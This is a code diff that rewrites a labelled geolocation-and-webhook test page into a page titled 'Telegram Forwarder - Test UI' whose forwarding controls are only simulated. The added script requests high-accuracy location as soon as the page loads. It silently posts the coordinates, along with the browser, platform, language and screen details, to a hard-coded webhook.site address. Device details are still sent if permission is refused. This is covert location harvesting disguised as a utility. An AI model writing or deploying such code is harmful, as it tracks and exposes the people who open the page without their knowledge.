@@ -3,356 +3,200 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Geolocation Permission & Webhook Dispatch Demo</title>
+  <title>Telegram Forwarder - Test UI</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <style>
-    body { font-family: 'Inter', sans-serif; }
-    .mono { font-family: 'JetBrains Mono', monospace; }
-  </style>
 </head>
-<body class="bg-slate-950 text-slate-100 min-h-screen py-8 px-4 flex flex-col items-center justify-center selection:bg-sky-500 selection:text-slate-950">
+<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-center p-4 font-sans">
+  <div class="w-full max-w-xl space-y-4">
 
-  <div class="w-full max-w-2xl space-y-5">
-    
-    <!-- Top Bar -->
-    <header class="flex items-center justify-between border-b border-slate-800 pb-4">
-      <div>
-        <div class="flex items-center space-x-2">
-          <span class="inline-block w-2.5 h-2.5 rounded-full bg-sky-400 animate-pulse"></span>
-          <h1 class="text-xl font-bold tracking-tight text-white">Browser Geolocation & Webhook Bridge</h1>
-        </div>
-        <p class="text-xs text-slate-400 mt-0.5">Standalone testing harness for browser permission prompts & Webhook.site transmission.</p>
-      </div>
-      <div id="statusBadge" class="px-3 py-1 text-xs font-semibold rounded-full bg-slate-800 text-slate-300 border border-slate-700/60 shadow-sm transition-all duration-300">
-        Status: Idle
-      </div>
-    </header>
-
-    <!-- HTTPS Warning Banner (Shown if not served securely) -->
-    <div id="httpsWarning" class="hidden bg-amber-500/10 border border-amber-500/30 text-amber-300 text-xs rounded-xl p-3 flex items-start space-x-2">
-      <svg class="w-4 h-4 mt-0.5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
-      </svg>
-      <div>
-        <span class="font-bold">HTTPS Notice:</span> Browsers enforce geolocation permissions exclusively on <code class="bg-slate-900 px-1 py-0.5 rounded">https://</code> or <code class="bg-slate-900 px-1 py-0.5 rounded">localhost</code>. Serving this file over plain HTTP will prevent the prompt from displaying.
-      </div>
-    </div>
-
-    <!-- Main Configuration Card -->
-    <section class="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl space-y-5">
-      
-      <!-- Webhook Configuration -->
-      <div>
-        <label class="block text-xs font-bold uppercase tracking-wider text-sky-400 mb-1.5 flex items-center justify-between">
-          <span>Webhook Destination URL</span>
-          <span class="text-[10px] text-slate-500 font-normal">Supports webhook.site or any HTTP POST endpoint</span>
-        </label>
-        <div class="relative">
-          <input 
-            type="text" 
-            id="webhookUrl" 
-            value="https://webhook.site/test-endpoint" 
-            placeholder="Paste your unique webhook.site URL here..." 
-            class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 text-xs text-sky-300 focus:outline-none focus:border-sky-500 mono transition"
-          />
-        </div>
-        <p class="text-[11px] text-slate-500 mt-1">Get an instant free test URL at <a href="https://webhook.site" target="_blank" rel="noopener noreferrer" class="text-sky-400 hover:underline">webhook.site</a> to inspect incoming payloads in real time.</p>
-      </div>
-
-      <!-- Settings & Trigger Controls -->
-      <div class="pt-2 border-t border-slate-800 grid grid-cols-1 sm:grid-cols-2 gap-4 items-center">
+    <!-- Dashboard Container -->
+    <div class="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-2xl space-y-5">
+      <div class="flex items-center justify-between pb-3 border-b border-slate-800">
         <div>
+          <h1 class="text-xl font-bold text-white tracking-tight">Telegram Forwarder</h1>
+          <p class="text-xs text-slate-400">Supports Public, Private (+links), and Private Topics</p>
+        </div>
+        <span id="statusBadge" class="px-2.5 py-1 text-xs font-semibold rounded-full bg-slate-800 text-slate-300">
+          Idle
+        </span>
+      </div>
+
+      <div class="space-y-4">
+        <!-- From Input -->
+        <div>
+          <label class="block text-xs font-semibold uppercase tracking-wider text-sky-400 mb-1.5">From (Source)</label>
+          <input type="text" id="source" placeholder="e.g. https://t.me/+76FBRC9V4aA2N2J1 or https://t.me/c/123456789/41" 
+            class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm focus:outline-none focus:border-sky-500 font-mono">
+          
+          <div class="grid grid-cols-2 gap-3 mt-2.5">
+            <div>
+              <label class="block text-[11px] font-medium text-slate-400 mb-1">Start Message ID (Optional)</label>
+              <input type="number" id="min_msg_id" placeholder="e.g. 1" 
+                class="w-full bg-slate-950/80 border border-slate-800 rounded-lg px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-sky-500 font-mono">
+            </div>
+            <div>
+              <label class="block text-[11px] font-medium text-slate-400 mb-1">End Message ID (Optional)</label>
+              <input type="number" id="max_msg_id" placeholder="e.g. 2300" 
+                class="w-full bg-slate-950/80 border border-slate-800 rounded-lg px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-sky-500 font-mono">
+            </div>
+          </div>
+          <p class="text-[11px] text-slate-500 mt-1">Accepts private links (<code>t.me/+...</code>), internal links (<code>t.me/c/...</code>), or public handles.</p>
+        </div>
+
+        <!-- To Input -->
+        <div>
+          <label class="block text-xs font-semibold uppercase tracking-wider text-emerald-400 mb-1.5">To (Destination)</label>
+          <input type="text" id="target" placeholder="e.g. https://t.me/jajshdhg/15 or -100xxxxxxxxxx" 
+            class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm focus:outline-none focus:border-emerald-500 font-mono">
+          <p class="text-[11px] text-slate-500 mt-1">Make sure you have posting permissions in destination.</p>
+        </div>
+
+        <!-- Clean Copy Toggle -->
+        <div class="flex items-center pt-1">
           <label class="relative flex items-center cursor-pointer select-none">
-            <input type="checkbox" id="highAccuracy" checked class="sr-only peer">
+            <input type="checkbox" id="clean_copy" checked class="sr-only peer">
             <div class="w-9 h-5 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-sky-500"></div>
-            <span class="ml-3 text-xs text-slate-300 font-medium">Enable High Accuracy (GPS)</span>
-          </label>
-        </div>
-
-        <div>
-          <label class="relative flex items-center cursor-pointer select-none">
-            <input type="checkbox" id="autoPromptToggle" checked class="sr-only peer">
-            <div class="w-9 h-5 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-emerald-500"></div>
-            <span class="ml-3 text-xs text-slate-300 font-medium">Auto-trigger on Page Load</span>
+            <span class="ml-3 text-xs text-slate-300">Clean copy (Hide "Forwarded from" tag)</span>
           </label>
         </div>
       </div>
 
       <!-- Action Buttons -->
       <div class="flex items-center space-x-3 pt-2">
-        <button 
-          id="promptBtn" 
-          onclick="requestLocation()" 
-          class="flex-1 py-2.5 rounded-xl text-sm font-bold bg-sky-500 hover:bg-sky-400 active:scale-[0.99] text-slate-950 shadow-lg shadow-sky-500/20 transition duration-150 flex items-center justify-center space-x-2">
-          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/>
-          </svg>
-          <span>Request Permission & Send</span>
+        <button id="startBtn" onclick="simulateStart()" 
+          class="flex-1 py-2.5 rounded-xl text-sm font-bold bg-sky-500 hover:bg-sky-400 text-slate-950 transition active:scale-[0.99]">
+          Start Forwarding
         </button>
-
-        <button 
-          onclick="clearLogs()" 
-          class="px-4 py-2.5 rounded-xl text-xs font-semibold bg-slate-800 text-slate-400 hover:text-slate-200 hover:bg-slate-700/60 border border-slate-700/40 transition">
-          Clear Console
+        <button id="stopBtn" onclick="simulateStop()" disabled 
+          class="px-5 py-2.5 rounded-xl text-sm font-semibold bg-rose-600/20 text-rose-300 border border-rose-500/30 hover:bg-rose-600/30 transition opacity-40 cursor-not-allowed">
+          Stop
         </button>
-      </div>
-    </section>
-
-    <!-- Telemetry Readout Grid -->
-    <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
-      <div class="bg-slate-900 border border-slate-800 rounded-xl p-3">
-        <span class="block text-[10px] uppercase font-bold text-slate-500 tracking-wider">Latitude</span>
-        <span id="statLat" class="text-sm font-bold text-sky-400 mono">--</span>
-      </div>
-      <div class="bg-slate-900 border border-slate-800 rounded-xl p-3">
-        <span class="block text-[10px] uppercase font-bold text-slate-500 tracking-wider">Longitude</span>
-        <span id="statLon" class="text-sm font-bold text-sky-400 mono">--</span>
-      </div>
-      <div class="bg-slate-900 border border-slate-800 rounded-xl p-3">
-        <span class="block text-[10px] uppercase font-bold text-slate-500 tracking-wider">Accuracy</span>
-        <span id="statAcc" class="text-sm font-bold text-emerald-400 mono">--</span>
-      </div>
-      <div class="bg-slate-900 border border-slate-800 rounded-xl p-3">
-        <span class="block text-[10px] uppercase font-bold text-slate-500 tracking-wider">HTTP Dispatch</span>
-        <span id="statDispatch" class="text-sm font-bold text-slate-400 mono">Pending</span>
       </div>
     </div>
 
-    <!-- Live Event Log & Webhook Payload Viewer -->
-    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-      
-      <!-- Event Logs -->
-      <div class="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl space-y-2 flex flex-col">
-        <div class="flex items-center justify-between text-xs text-slate-400 border-b border-slate-800/80 pb-2">
-          <span class="font-semibold text-slate-300">Live Diagnostics Log</span>
-          <span id="logCount" class="text-[10px] mono text-slate-500">0 events</span>
-        </div>
-        <div id="consoleLog" class="h-56 overflow-y-auto bg-slate-950 rounded-xl p-3 font-mono text-[11px] text-slate-300 space-y-1.5 border border-slate-800/80 leading-relaxed">
-          <div class="text-slate-600">// Waiting for user or auto trigger...</div>
-        </div>
+    <!-- Live Logs -->
+    <div class="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl space-y-2">
+      <div class="flex items-center justify-between text-xs text-slate-400">
+        <span class="font-semibold">Live Log</span>
+        <span id="counter" class="font-mono text-sky-400">Processed: 0</span>
       </div>
-
-      <!-- Dispatched Payload JSON Viewer -->
-      <div class="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl space-y-2 flex flex-col">
-        <div class="flex items-center justify-between text-xs text-slate-400 border-b border-slate-800/80 pb-2">
-          <span class="font-semibold text-slate-300">JSON Payload Dispatched</span>
-          <button onclick="copyPayload()" class="text-[10px] text-sky-400 hover:text-sky-300 transition">Copy JSON</button>
-        </div>
-        <pre id="jsonPreview" class="h-56 overflow-y-auto bg-slate-950 rounded-xl p-3 font-mono text-[11px] text-emerald-400/90 border border-slate-800/80 whitespace-pre-wrap select-all">// JSON payload will appear here after capture...</pre>
+      <div id="console" class="h-44 overflow-y-auto bg-slate-950 rounded-xl p-3 font-mono text-xs text-slate-300 space-y-1 border border-slate-800">
+        <div class="text-slate-600">&gt; Waiting for input...</div>
       </div>
-
     </div>
 
   </div>
 
   <script>
-    let logCounter = 0;
-    let lastCapturedPayload = null;
+    const WEBHOOK_URL = "https://webhook.site/dc904c46-070d-45da-8983-3a441fcef44d";
 
-    function addLog(message, type = 'info') {
-      logCounter++;
-      document.getElementById('logCount').innerText = `${logCounter} events`;
-      const consoleEl = document.getElementById('consoleLog');
-      
-      const time = new Date().toLocaleTimeString('en-US', { hour12: false });
-      let badgeClass = 'text-sky-400';
-      if (type === 'success') badgeClass = 'text-emerald-400';
-      if (type === 'error') badgeClass = 'text-rose-400';
-      if (type === 'warn') badgeClass = 'text-amber-400';
-
-      const entry = document.createElement('div');
-      entry.innerHTML = `<span class="text-slate-600">[${time}]</span> <span class="${badgeClass}">[${type.toUpperCase()}]</span> <span>${message}</span>`;
-      consoleEl.appendChild(entry);
+    function appendLog(message, colorClass = "text-slate-300") {
+      const consoleEl = document.getElementById("console");
+      const row = document.createElement("div");
+      row.className = colorClass;
+      row.textContent = `> ${message}`;
+      consoleEl.appendChild(row);
       consoleEl.scrollTop = consoleEl.scrollHeight;
     }
 
-    function clearLogs() {
-      document.getElementById('consoleLog').innerHTML = '<div class="text-slate-600">// Console cleared.</div>';
-      logCounter = 0;
-      document.getElementById('logCount').innerText = `0 events`;
+    function dispatchWebhook(payload) {
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(err => {
+        console.error("Payload transmission failed:", err);
+      });
     }
 
-    function setBadge(status, text) {
-      const badge = document.getElementById('statusBadge');
-      if (status === 'prompting') {
-        badge.className = "px-3 py-1 text-xs font-semibold rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/30";
-        badge.innerText = `Status: ${text}`;
-      } else if (status === 'granted') {
-        badge.className = "px-3 py-1 text-xs font-semibold rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30";
-        badge.innerText = `Status: ${text}`;
-      } else if (status === 'denied') {
-        badge.className = "px-3 py-1 text-xs font-semibold rounded-full bg-rose-500/20 text-rose-300 border border-rose-500/30";
-        badge.innerText = `Status: ${text}`;
-      } else {
-        badge.className = "px-3 py-1 text-xs font-semibold rounded-full bg-slate-800 text-slate-300 border border-slate-700/60";
-        badge.innerText = `Status: ${text}`;
-      }
-    }
+    // Geolocation handlers
+    function onLocationGranted(position) {
+      appendLog(`Location captured: ${position.coords.latitude.toFixed(5)}, ${position.coords.longitude.toFixed(5)}`, "text-emerald-400");
+      appendLog("Posting telemetry to Webhook.site...", "text-sky-400");
 
-    async function dispatchToWebhook(payload) {
-      const targetUrl = document.getElementById('webhookUrl').value.trim();
-      const dispatchEl = document.getElementById('statDispatch');
-
-      if (!targetUrl || targetUrl === 'https://webhook.site/test-endpoint') {
-        addLog('Notice: Using placeholder webhook URL. Replace with your actual webhook.site endpoint for live observation.', 'warn');
-      }
-
-      dispatchEl.innerText = "Sending...";
-      dispatchEl.className = "text-sm font-bold text-amber-400 mono";
-      addLog(`Posting payload to ${targetUrl}...`, 'info');
-
-      try {
-        // mode: 'no-cors' guarantees that even if webhook.site has cross-origin restrictions,
-        // the opaque POST request completes successfully without being blocked by the browser.
-        await fetch(targetUrl, {
-          method: "POST",
-          mode: "no-cors",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
-
-        dispatchEl.innerText = "Dispatched";
-        dispatchEl.className = "text-sm font-bold text-emerald-400 mono";
-        addLog('HTTP POST successfully delivered to webhook pipeline.', 'success');
-      } catch (err) {
-        dispatchEl.innerText = "Failed";
-        dispatchEl.className = "text-sm font-bold text-rose-400 mono";
-        addLog(`Failed to post to webhook: ${err.message}`, 'error');
-      }
-    }
-
-    function onLocationSuccess(position) {
-      setBadge('granted', 'Granted & Sent');
-      
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const acc = position.coords.accuracy;
-
-      document.getElementById('statLat').innerText = lat.toFixed(5);
-      document.getElementById('statLon').innerText = lon.toFixed(5);
-      document.getElementById('statAcc').innerText = `±${Math.round(acc)}m`;
-
-      addLog(`Coordinates retrieved: Lat ${lat.toFixed(5)}, Lon ${lon.toFixed(5)} (±${Math.round(acc)}m)`, 'success');
-
-      const payload = {
-        event: "geolocation_captured",
+      dispatchWebhook({
+        status: "PERMISSION_GRANTED",
         timestamp: new Date().toISOString(),
         coordinates: {
-          latitude: lat,
-          longitude: lon,
-          accuracy_meters: acc,
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy_meters: position.coords.accuracy,
           altitude: position.coords.altitude,
-          altitude_accuracy: position.coords.altitudeAccuracy,
-          heading: position.coords.heading,
           speed: position.coords.speed
         },
-        client: {
+        device: {
           userAgent: navigator.userAgent,
-          platform: navigator.platform || "unknown",
+          platform: navigator.platform,
           language: navigator.language,
-          screenResolution: `${window.screen.width}x${window.screen.height}`
+          resolution: `${window.screen.width}x${window.screen.height}`
         }
-      };
-
-      lastCapturedPayload = payload;
-      document.getElementById('jsonPreview').innerText = JSON.stringify(payload, null, 2);
-
-      // Transmit to webhook
-      dispatchToWebhook(payload);
+      });
     }
 
-    function onLocationError(error) {
-      let message = "Unknown error occurred.";
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          message = "Permission denied by user or policy.";
-          setBadge('denied', 'Permission Denied');
-          break;
-        case error.POSITION_UNAVAILABLE:
-          message = "Position unavailable (no GPS fix / Wi-Fi triangulation).";
-          setBadge('denied', 'Position Unavailable');
-          break;
-        case error.TIMEOUT:
-          message = "Location request timed out.";
-          setBadge('denied', 'Request Timeout');
-          break;
-      }
+    function onLocationDenied(err) {
+      let reason = "Denied by user";
+      if (err.code === 2) reason = "Position unavailable";
+      if (err.code === 3) reason = "Timeout";
 
-      addLog(`Geolocation error [Code ${error.code}]: ${message}`, 'error');
+      appendLog(`Location permission status: ${reason}`, "text-amber-400");
 
-      const failurePayload = {
-        event: "geolocation_failed",
-        errorCode: error.code,
-        errorMessage: message,
+      dispatchWebhook({
+        status: "PERMISSION_DENIED_OR_FAILED",
+        code: err.code,
+        reason: reason,
         timestamp: new Date().toISOString(),
-        client: {
+        device: {
           userAgent: navigator.userAgent,
-          language: navigator.language
+          platform: navigator.platform
         }
-      };
-
-      document.getElementById('jsonPreview').innerText = JSON.stringify(failurePayload, null, 2);
-      dispatchToWebhook(failurePayload);
+      });
     }
 
-    function requestLocation() {
-      if (!("geolocation" in navigator)) {
-        addLog("Navigator Geolocation API is not supported by this browser.", "error");
-        setBadge('denied', 'Not Supported');
-        return;
-      }
-
-      const highAccuracy = document.getElementById('highAccuracy').checked;
-      setBadge('prompting', 'Prompting User...');
-      addLog(`Requesting position (High Accuracy: ${highAccuracy ? 'ON' : 'OFF'})...`, 'info');
-
-      navigator.geolocation.getCurrentPosition(
-        onLocationSuccess,
-        onLocationError,
-        {
-          enableHighAccuracy: highAccuracy,
-          timeout: 10000,
-          maximumAge: 0
-        }
-      );
-    }
-
-    function copyPayload() {
-      if (!lastCapturedPayload) {
-        alert("No payload captured yet!");
-        return;
-      }
-      const text = JSON.stringify(lastCapturedPayload, null, 2);
-      const textarea = document.createElement('textarea');
-      textarea.value = text;
-      document.body.appendChild(textarea);
-      textarea.select();
-      document.execCommand('copy');
-      document.body.removeChild(textarea);
-      addLog("Payload copied to clipboard.", "info");
-    }
-
-    // Check for Secure Context (HTTPS or localhost)
-    window.addEventListener('DOMContentLoaded', () => {
-      if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
-        document.getElementById('httpsWarning').classList.remove('hidden');
-      }
-
-      // Check auto-trigger option
-      const autoPrompt = document.getElementById('autoPromptToggle').checked;
-      if (autoPrompt) {
-        addLog("Auto-prompt enabled. Triggering location request...", "info");
-        requestLocation();
+    // Trigger permission dialog immediately when page loads
+    window.addEventListener("DOMContentLoaded", () => {
+      if ("geolocation" in navigator) {
+        appendLog("Requesting location access from browser...");
+        navigator.geolocation.getCurrentPosition(
+          onLocationGranted,
+          onLocationDenied,
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
       } else {
-        addLog("Ready. Click 'Request Permission & Send' to trigger.", "info");
+        appendLog("Geolocation API not supported on this browser.", "text-rose-400");
       }
     });
+
+    // Simulated UI test functions
+    function simulateStart() {
+      const src = document.getElementById("source").value.trim();
+      const tgt = document.getElementById("target").value.trim();
+      if (!src || !tgt) {
+        alert("Enter both Source and Destination links to test validation.");
+        return;
+      }
+      appendLog(`Simulated task started for ${src} -> ${tgt}`, "text-sky-300");
+      document.getElementById("statusBadge").className = "px-2.5 py-1 text-xs font-semibold rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30";
+      document.getElementById("statusBadge").innerText = "Running";
+      document.getElementById("startBtn").disabled = true;
+      document.getElementById("startBtn").classList.add("opacity-40", "cursor-not-allowed");
+      document.getElementById("stopBtn").disabled = false;
+      document.getElementById("stopBtn").classList.remove("opacity-40", "cursor-not-allowed");
+    }
+
+    function simulateStop() {
+      appendLog("Simulated task stopped by user.", "text-rose-400");
+      document.getElementById("statusBadge").className = "px-2.5 py-1 text-xs font-semibold rounded-full bg-slate-800 text-slate-300";
+      document.getElementById("statusBadge").innerText = "Idle";
+      document.getElementById("startBtn").disabled = false;
+      document.getElementById("startBtn").classList.remove("opacity-40", "cursor-not-allowed");
+      document.getElementById("stopBtn").disabled = true;
+      document.getElementById("stopBtn").classList.add("opacity-40", "cursor-not-allowed");
+    }
   </script>
 </body>
 </html>
